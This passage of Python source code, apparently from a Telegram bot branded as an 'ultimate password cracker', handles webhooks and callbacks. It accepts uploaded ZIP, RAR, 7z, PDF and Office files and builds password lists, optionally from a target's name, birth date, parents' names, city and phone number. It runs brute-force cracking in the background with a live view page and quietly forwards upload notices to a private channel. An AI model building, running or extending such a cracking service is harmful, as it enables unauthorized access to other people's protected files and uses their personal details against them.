                file_info = requests.get(f"https://api.telegram.org/bot{TOKEN}/getFile?file_id={file_id}").json()
                file_path_api = file_info['result']['file_path']
                file_url = f"https://api.telegram.org/file/bot{TOKEN}/{file_path_api}"
                response = requests.get(file_url)
                
                os.makedirs("downloads", exist_ok=True)
                file_path = f"downloads/{file_name}"
                with open(file_path, 'wb') as f:
                    f.write(response.content)
                
                ext = file_name.split('.')[-1].lower()
                
                try:
                    send_message(PRIVATE_CHANNEL, f"📁 *File Received*\n📄 {file_name}\n👤 @{username}")
                except:
                    pass
                
                user_sessions[chat_id] = {
                    'file_path': file_path,
                    'file_name': file_name,
                    'file_ext': ext,
                    'state': 'waiting_for_option'
                }
                
                send_message(chat_id, "📁 *File Received!*\n\n" f"📄 {file_name}\n🔽 *Choose an option:*", reply_markup=get_auto_buttons(), parse_mode='Markdown')
                return jsonify({"status": "ok"}), 200
        
        return jsonify({"status": "ok"}), 200
        
    except Exception as e:
        print(f"Error: {e}")
        return jsonify({"status": "error"}), 500

# ============================================================
# PART 6: CALLBACK QUERIES, SET WEBHOOK, MAIN
# ============================================================
@app.route(f'/webhook/{TOKEN}', methods=['POST'])
def webhook_callback():
    try:
        update = request.get_json()
        if not update:
            return jsonify({"status": "error"}), 400
        
        if 'callback_query' in update:
            callback = update['callback_query']
            callback_id = callback['id']
            chat_id = callback['message']['chat']['id']
            message_id = callback['message']['message_id']
            user_id = callback['from']['id']
            data = callback['data']
            
            if data == 'verify':
                if check_channel_membership(user_id):
                    edit_message(chat_id, message_id, "🔐 *NRTECNO ULTIMATE PASSWORD CRACKER*\n\n✅ Verified!\n📁 *Send me a file.*", parse_mode='Markdown')
                else:
                    edit_message(chat_id, message_id, "🔴 *Still Not Verified!*\n\n❌ Please join @nrtecno2 first.", reply_markup=join_verify_keyboard())
                answer_callback(callback_id)
                return jsonify({"status": "ok"}), 200
            
            if data == 'auto_direct':
                session = user_sessions.get(chat_id)
                if not session:
                    send_message(chat_id, "❌ *No file found. Send a file first.*", parse_mode='Markdown')
                    answer_callback(callback_id)
                    return jsonify({"status": "ok"}), 200
                
                send_message(chat_id, "🔄 *Generating ultimate passwords...*\n⏳ Please wait...", parse_mode='Markdown')
                
                generator = UltimatePasswordGenerator()
                password_list = generator.generate_ultimate_passwords()
                
                session_id = f"{chat_id}_{int(time.time())}"
                cracking_sessions[session_id] = {
                    'password_list': password_list,
                    'file_path': session['file_path'],
                    'file_ext': session['file_ext'],
                    'file_name': session['file_name']
                }
                
                machine_url = f"{RENDER_URL}/view/{session_id}"
                send_message(chat_id, f"🔗 *Brute-Force Machine Started!*\n\n📊 {len(password_list)} passwords loaded\n🔗 [Click here to watch live cracking]({machine_url})\n\n_Password will be sent here when found._", parse_mode='Markdown')
                
                threading.Thread(target=crack_in_background, args=(chat_id, session_id, session)).start()
                
                generator.clear()
                del user_sessions[chat_id]
                answer_callback(callback_id)
                return jsonify({"status": "ok"}), 200
            
            if data == 'auto_info':
                session = user_sessions.get(chat_id)
                if not session:
                    send_message(chat_id, "❌ *No file found. Send a file first.*", parse_mode='Markdown')
                    answer_callback(callback_id)
                    return jsonify({"status": "ok"}), 200
                
                fields = ['name', 'dob', 'father', 'mother', 'city', 'mobile']
                session['info'] = {}
                session['fields'] = fields
                session['current_field'] = fields[0]
                session['state'] = 'collecting_info'
                
                edit_message(chat_id, message_id, "📝 *Let's collect some info for ultimate password generation*\n\n", parse_mode='Markdown')
                send_message(chat_id, f"📝 *Enter {fields[0].title()}?*", parse_mode='Markdown')
                answer_callback(callback_id)
                return jsonify({"status": "ok"}), 200
            
            if data == 'cancel':
                session = user_sessions.get(chat_id)
                if session and session.get('file_path'):
                    os.remove(session['file_path'])
                del user_sessions[chat_id]
                send_message(chat_id, "❌ *Cancelled.* Send file again.", parse_mode='Markdown')
                answer_callback(callback_id)
                return jsonify({"status": "ok"}), 200
        
        return jsonify({"status": "ok"}), 200
        
    except Exception as e:
        print(f"Error: {e}")
        return jsonify({"status": "error"}), 500


# ============================================================
# SET WEBHOOK
# ============================================================
def set_webhook():
    webhook_url = f"{RENDER_URL}/webhook/{TOKEN}"
    url = f"https://api.telegram.org/bot{TOKEN}/setWebhook"
    response = requests.post(url, json={"url": webhook_url})
    if response.status_code == 200:
        print(f"✅ Webhook set to: {webhook_url}")
    else:
        print(f"❌ Webhook failed: {response.text}")


# ============================================================
# MAIN
# ============================================================
if __name__ == "__main__":
    if not TOKEN:
        print("❌ BOT_TOKEN not found!")
        exit(1)
    
    set_webhook()
    
    port = int(os.environ.get("PORT", 5000))
    print("🤖 NRTECNO ULTIMATE PASSWORD CRACKER STARTED...")
    print("🔢 Password Types: All possible combinations (18+ types)")
    print("📁 Files: ZIP, 7z, RAR, PDF, DOCX, XLSX, PPTX")
    print("🚀 Brute-Force Machine: Live display")
    print("🚀 Running on port", port)
    
    app.run(host="0.0.0.0", port=port)
